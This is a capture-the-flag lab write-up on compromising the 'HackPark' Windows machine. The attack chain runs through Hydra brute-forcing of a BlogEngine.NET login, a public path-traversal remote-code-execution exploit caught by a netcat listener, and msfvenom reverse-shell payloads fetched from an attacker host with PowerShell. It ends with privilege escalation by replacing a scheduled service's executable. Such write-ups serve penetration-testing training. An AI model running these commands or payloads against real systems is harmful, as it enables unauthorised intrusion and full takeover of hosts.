# HackPark (BlogEngine)

### **HackPark** <a href="#kisdcnmf4281" id="kisdcnmf4281"></a>

* Hack Windows with Hydra, Remote Code Execution, and WinPEAS.

### **Brute-force a login using Hydra** <a href="#id-4ne288t8yhcr" id="id-4ne288t8yhcr"></a>

* Hydra is a parallelised, fast and flexible login cracker.
* Dictionary brute forcing iterates through a wordlist to obtain the password.

**1. Identify login page method.**

* Web servers typically make two types of requests.
  * **GET** request used to request data.
  * **POST** used to send data.

1. Right click on login form.
2. **Inspect** element.
3. Enter any credentials and attempt to login
4. Read **Method** field value in **Network** tab.

* Can also identify this by intercepting traffic through BurpSuite.

**2. Use Hydra to brute force login form.**

* Login or Wordlist for Usernames = admin.
  * Internet search for "blogengine.net" default credentials returns "admin" / "admin".
* Password or Wordlist for Passwords = /usr/share/wordlists/rockyou.txt.
* IP address or Hostname = 10.10.85.185.
* HTTP Method (POST/GET) = http-form-post.
* Directory/Path to the Login Page = /Account/login.aspx?ReturnURL=/admin.
  * Request header **File** attribute.
* Request Body for Username/Password = "ctl00$MainContent$LoginUser$UserName","ctl00$MainContent$LoginUser$Password","ctl00$MainContent$LoginUser$LoginButton"
  * **Inspect Element** in browser.
  * **Network** tab of developer tools.
  * Attempt a login.
  * Right click on request > **Edit and Resend**.
  * **Request Body** contains entered username and password.

\_\_VIEWSTATE=n2Y4BvVM5bhPxAiXh74eXb7%2F8bdFppITpAKoQzTYg%2F2Om8M2jGykZaw0JQHHB7hSlgHYkUTBvZKICSfpKgSGO7WToz%2F5w8knI%2BcOvKnYLsFIoll7jX6KwikzZLXashyviPyM9cozXH3WjB1ntR6ZDzvWtv11PxlYsmLCF4cBDmyAIQZ8wcagcXhF%2BssBYrpkopBVNWT03AkHUXHBVrSr%2BtiPAHdxdQJgEwOrY2c6otNnHWnwHZ8M%2FwlLhfplATLyIIfw00UzSNyS9IO7iuKLDQfvVv9SlS5LxbJj%2FZiOTaFIwfsvD8GYpSOmkxhb8mnfa46dJ5GYwACBfy1xWPRhtGbfz1gUOunVnQ1n9GjBPnqiWjiD&\_\_EVENTVALIDATION=YN0knyrHqnj2RIDRzLwosbSl6DHwbB8zpiYoY%2FMw4N0J0gthwdTUm6moqRkULBrBukYlEAJq9Mwxc5Yfi4TBMemG8xjPaVMXN2P6AM0MY5ssFs2K93q4Xn4am8cO2wzdh3TMIbY%2BOifwxGGvHMA6RJIHcpVe%2FjrCVFdCaR2RjG%2FhIpRl\&ctl00%24MainContent%24LoginUser%24UserName=admin\&ctl00%24MainContent%24LoginUser%24Password=test\&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in

* Replace entered username with \`^USER^ to tell Hydra to enter words from wordlist in this position of the request.
* Replace entered password with ^PASS^.
* Way to Identify Failed Attempts = Login failed.

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.85.185 http-form-post "/Account/login.aspx?ReturnURL=/admin:\_\_VIEWSTATE=n2Y4BvVM5bhPxAiXh74eXb7%2F8bdFppITpAKoQzTYg%2F2Om8M2jGykZaw0JQHHB7hSlgHYkUTBvZKICSfpKgSGO7WToz%2F5w8knI%2BcOvKnYLsFIoll7jX6KwikzZLXashyviPyM9cozXH3WjB1ntR6ZDzvWtv11PxlYsmLCF4cBDmyAIQZ8wcagcXhF%2BssBYrpkopBVNWT03AkHUXHBVrSr%2BtiPAHdxdQJgEwOrY2c6otNnHWnwHZ8M%2FwlLhfplATLyIIfw00UzSNyS9IO7iuKLDQfvVv9SlS5LxbJj%2FZiOTaFIwfsvD8GYpSOmkxhb8mnfa46dJ5GYwACBfy1xWPRhtGbfz1gUOunVnQ1n9GjBPnqiWjiD&\_\_EVENTVALIDATION=YN0knyrHqnj2RIDRzLwosbSl6DHwbB8zpiYoY%2FMw4N0J0gthwdTUm6moqRkULBrBukYlEAJq9Mwxc5Yfi4TBMemG8xjPaVMXN2P6AM0MY5ssFs2K93q4Xn4am8cO2wzdh3TMIbY%2BOifwxGGvHMA6RJIHcpVe%2FjrCVFdCaR2RjG%2FhIpRl\&ctl00%24MainContent%24LoginUser%24UserName=^USER^\&ctl00%24MainContent%24LoginUser%24Password=^PASS^\&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -vV

\[80]\[http-post-form] host: 10.10.85.185 login: admin password: 1qaz2wsx

| **Command**                                                                                                                                      | **Description**                                                                                                |
| ------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------- |
| hydra -P \<wordlist> -v \<ip> \<protocol>                                                                                                        | Brute force against specific protocol.                                                                         |
| hydra -v -V -L \<username list> -P \<password list> -t -u \<p> \<protocol>                                                                       | Bruteforce usernames. Loops through every combination in the lists. -v -V verbose mode showing login attempts. |
| hydra -t 1 -V -f -l \<username> -P \<password list> rdp://\<ip>                                                                                  | Bruteforce Windows Remote Desktop using password list.                                                         |
| hydra -l \<username> -P \<password list> $ip -V http-form-post '/wp-login.php:log=^USER^\&pwd=^PASS^\&wp-submit=Log In\&testcookie=1:S=Location' | Craft more specific request to bruteforce.                                                                     |

### **Compromise the target** <a href="#id-8ublueas01cm" id="id-8ublueas01cm"></a>

**1.**[ **Identify exploit from Exploit Database**](https://www.exploit-db.com/) **to gain initial access.**

* Exploit-db is common Vulnerability and Exposures (CVE) archive of public exploits.
  * Used by pentesters and vulnerability researchers.
  * Owned by Offensive Security.
* Log into blogengine.net website on target using bruteforced credentials.
  * **Burger menu** > **About** shows version as 3.3.6.0.
  * Application is vulnerable to[ BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution](https://www.exploit-db.com/exploits/46353).
    * [CVE-2019-6714](https://nvd.nist.gov/vuln/detail/CVE-2019-6714).

**2. Execute public exploit.**

* Create "HackPark" folder on attack host's Desktop.
* Download[ exploit from Exploit Database](https://www.exploit-db.com/exploits/46353) into folder.
* Edit exploit with vim.
  * Change **TcpClient** address to attack host.
  * Save and exit vim.
* Rename exploit to PostView.ascx.

cp 46353.cs PostView.ascx

* Start reverse TCP listener on attack host.

nc -lvnp 4445

* Upload PostView.ascx to target.
  * Use **File Manager** feature.
    * Edit a post > click on icon that looks like an open file in the toolbar.
  * Save post.

**3. Trigger vulnerability.**

Access base URL for the blog with a theme override specified to exploit path traversal vulnerability leading to remote code execution.

http://TARGET\_IP/?theme=../../App\_Data/files

* Reverse shell caught by listener.

Connection from TARGET\_IP 49242 received!

Microsoft Windows \[Version 6.3.9600]

(c) 2013 Microsoft Corporation. All rights reserved.

whoami

c:\windows\system32\inetsrv>whoami

iis apppool\blog

### **Windows Privilege Escalation** <a href="#ze2ue95n5o7w" id="ze2ue95n5o7w"></a>

**1. Pivot from netcat to meterpreter session.**

* Generate reverse shell using msfvenom.

msfvenom -p windows/meterpreter/reverse\_tcp -a x86 --encoder x86/shikata\_ga\_nai lhost=ATTACKER\_IP lport=4446 -f exe -o shell.exe

**2. Create http server to serve payload.**

* Ensure HTTP server is running from directory where "shell.exe" is located.

python3 -m http.server

**3. Download payload to target.**

* Browse to c:\windows\temp as this directory is generally world writable.

powershell -c "Invoke-WebRequest -Uri 'http://ATTACKER\_IP:8000/shell.exe' -OutFile 'shell.exe'"

**3. Verify handler is set up in Metasploit.**

* Use Metasploit handler to receive incoming connection from reverse shell.

msfconsole

use exploit/multi/handler

set payload windows/meterpreter/reverse\_tcp

set lhost ATTACKER\_IP

set lport 4446

exploit

**4. Start reverse shell on target.**

.\shell.exe

**5. Meterpreter reverse shell spawned.**

\[\*] Meterpreter session 1 opened (ATTACKER\_IP:4446 -> TARGET\_IP:49294) at 2024-02-26 11:49:46 +0000

getuid

Server username: IIS APPPOOL\Blog

**6. Use meterpreter session to enumerate target to identify potential vulnerabilities.**

* Run[ WES-NG: Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng) script to quickly identify obvious vulnerabilities.
  * Runs on attack host to avoid making unnecessary noise on target that can attract attention.

1. Clone GitHub respository.

git clone https://github.com/bitsadmin/wesng --depth 1

1. Obtain latest database of vulnerabilities.

* Database used to check for missing patches that can result in vulnerabilities allowing elevation of privileges on target.

wes.py --update

1. Use Windows systeminfo.exe on target to check for missing patches.

shell

systeminfo.exe > systeminfo.txt

1. Download systeminfo file to attack host.

exit

download ./systeminfo.txt /root/Desktop/HackPark

1. Feed system information into WES-NG script.

./wesng/wes.py systeminfo.txt > wesng.txt

**7. Use WinPEAS for further enumeration.**

* Download WinPEAS to attack host.

wget https://github.com/carlospolop/PEASS-ng/releases/download/20240225-d29d697a/winPEASx64.exe

* Upload WinPEAS to target and execute script.

upload /root/Desktop/HackPark/winPEASx64.exe

shell

.\winPEASx64.exe servicesinfo > winpeas.txt

type winpeas.txt

* "WindowsScheduler" service running with "SystemScheduler" folder writable for Everyone.

WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)\[C:\PROGRA\~2\SYSTEM\~1\WService.exe] - Auto - Running

File Permissions: Everyone \[WriteData/CreateFiles]

Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone \[WriteData/CreateFiles])

System Scheduler Service Wrapper

* Browse to "c:\Program files (x86)\systemscheduler" directory.
  * "logfile.txt" shows that service is running every 30 seconds.
  * "logfileadvanced.txt" shows that service runs using administive privileges.

02/26/24 02:37:21,ElevationType1:1 Elevation2:1 \*\*\*IntegrityLevel3:12288 (:)

02/26/24 02:37:21,AD1=1 AD2=1 (:)

02/26/24 02:37:21,Preferences Loading (Administrator:1)

* "Events" subfolder contains "20198415519.INI\_LOG.txt".
  * "message.exe" binary is used by "SystemScheduler" service.

02/26/24 06:14:01,Event Started Ok, (Administrator)

02/26/24 06:14:33,Process Ended. PID:2964,ExitCode:4,Message.exe (Administrator)

**8. Use gathered information to exploit target and become Administrator.**

* Generate another payload using msfvenom.

msfvenom -p windows/meterpreter/reverse\_tcp -a x86 --encoder x86/shikata\_ga\_nai lhost=ATTACKER\_IP lport=4446 -f exe -o shell2.exe

* Upload payload to target using meterpreter reverse shell.

cd "c:\\\Program Files (x86)\\\SystemScheduler"

upload /root/Desktop/HackPark/shell2.exe

mv Message.exe Message.exe.bkp

* Overwrite service executable with reverse shell on target.

mv shell2.exe Message.exe

* Background current meterpreter session and create another listener.

background

exploit

* Gain shell as administrator on listener.
  * Wait for "WindowsScheduler" to run to receive another meterpreter with root.

\[\*] Sending stage (175686 bytes) to TARGET\_IP

\[\*] Meterpreter session 2 opened (ATTACKING\_IP:2345 -> TARGET\_IP:49565) at 2024-02-26 15:30:02 +0000

getuid

Server username: HACKPARK\Administrator

### **Privilege Escalation Without Metasploit** <a href="#id-53sizkedk6mv" id="id-53sizkedk6mv"></a>

**1. Pivot from netcat session to more stable reverse shell.**

* Create msfvenom payload using "windows/shell\_reverse\_tcp".

msfvenom -p windows/shell\_reverse\_tcp -a x86 --encoder x86/shikata\_ga\_nai lhost=10.10.68.184 lport=3456 -f exe -o shell3.exe

* Create http server to serve payload.

python3 -m http.server

* Pull payload onto target using PowerShell.
  * "C:\Windows\Temp" directory is generally world writable.

powershell -c "Invoke-WebRequest -Uri 'http://ATTACKER\_IP:8000/shell3.exe' -OutFile 'c:\windows\temp\shell3.exe'"

* Create netcat listener.

nc -lvnp 3456

* Execute reverse shell.

.\windows\temp\shell3.exe

* Reverse shell received by listener.

Connection from 10.10.197.245 49625 received!

Microsoft Windows \[Version 6.3.9600]

(c) 2013 Microsoft Corporation. All rights reserved.

whoami

iis apppool\blog

**2. Use WinPEAS to enumerate target for potential vulnerabilities.**

* Download WinPEAS.bat to attack host.

wget https://github.com/carlospolop/PEASS-ng/releases/download/20240225-d29d697a/winPEAS.bat

* Pull WinPEAS.bat to target.

powershell -c "Invoke-WebRequest -Uri 'http://ATTACKER\_IP:8000/winPEAS.bat' -OutFile 'c:\windows\temp\winPEAS.bat'"

* Use WinPEAS to enumerate and recommend potential vulnerabilities to exploit.
  * .\filename.exe\` used to execute files.

.\winpeas.bat > winpeas.txt

* Running processes are of interest in this use case.

**3. Use gathered information to escalate to Administrator.**

As per above methodology.
